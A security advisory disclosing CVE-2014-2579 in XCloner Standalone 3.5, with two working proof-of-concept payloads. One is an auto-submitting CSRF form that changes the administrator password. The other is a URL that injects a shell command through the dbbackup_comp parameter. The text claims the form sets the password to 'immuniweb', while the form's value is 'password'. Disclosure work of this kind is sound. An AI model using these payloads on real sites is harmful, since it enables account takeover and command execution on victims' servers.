Vendor: XCloner
Vulnerable Version(s): 3.5 and probably prior
Tested Version: 3.5
Advisory Publication:  March 14, 2014  [without technical details]
Vendor Notification: March 14, 2014 
Public Disclosure: April 9, 2014 
Vulnerability Type: Cross-Site Request Forgery [CWE-352]
CVE Reference: CVE-2014-2579
Risk Level: High 
CVSSv2 Base Score: 7.6 (AV:N/AC:H/Au:N/C:C/I:C/A:C)
Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 

-----------------------------------------------------------------------------------------------

Advisory Details:

High-Tech Bridge Security Research Lab discovered vulnerability in XCloner Standalone, which can be exploited to perform Сross-Site Request Forgery (CSRF) attacks and gain complete control over the website.


1. Сross-Site Request Forgery (CSRF) in XCloner Standalone: CVE-2014-2579

1.1 The vulnerability exists due to insufficient validation of HTTP request origin. A remote attacker can trick a logged-in administrator to visit a specially crafted webpage and change administrator’s password.

The exploitation example below changes password for user 'login' to 'immuniweb':


<form action="http://[host]/index2.php" method="post" name="main">
<input type="hidden" name="jcuser" value="login">
<input type="hidden" name="jcpass" value="password">
<input type="hidden" name="option" value="com_cloner">
<input type="hidden" name="task" value="config">
<input type="hidden" name="action" value="save">
<script>
document.main.submit();
</script>
</form>


1.2 The vulnerability exists due to insufficient validation of HTTP request origin. A remote attacker can trick a logged-in administrator to visit a specially crafted webpage and execute arbitrary system commands on vulnerable system with privileges of the webserver.

The exploitation example below uses the 'echo' system command to write 'immuniweb' string into file '/var/www/file.php':

http://[host]/index2.php?option=com_cloner&task=generate&bname=1&dbbackup=1&cron_access=1&dbbackup_comp=||%20echo immuniweb > /var/www/file.php%20||

Successful exploitation of this vulnerability requires that options 'enable_db_backup' and 'sql_mem'  are enabled in application’s configuration file.

-----------------------------------------------------------------------------------------------

Solution:

Vendor ignored:
- 6 notifications by email
- 4 notifications via contact form
- 1 notification via twitter. 

Currently we are not aware of any official solution for this vulnerability. As a temporary solution it is recommended to remove the vulnerable script or restrict access to it via WAF of .htaccess.

